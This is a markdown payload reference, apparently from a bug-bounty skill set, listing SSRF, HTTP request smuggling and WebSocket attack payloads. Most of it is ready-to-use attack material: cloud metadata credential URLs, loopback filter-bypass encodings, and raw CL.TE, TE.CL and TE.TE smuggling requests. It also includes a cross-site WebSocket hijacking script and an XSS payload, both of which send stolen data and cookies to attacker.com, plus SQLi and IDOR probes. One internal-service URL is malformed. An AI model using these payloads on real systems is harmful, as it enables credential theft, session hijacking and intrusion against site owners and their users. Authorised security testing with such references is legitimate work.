# Protocol-level payloads — SSRF, HTTP smuggling, WebSocket

> Payload reference only. The owning `hunt-*` skill for each class carries the
> detection methodology, the bypass ladder and the chain templates — load it once
> the class is confirmed. A payload without the method behind it is a guess.

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### Impact Chain
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### Injection via WS Messages
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
```

---

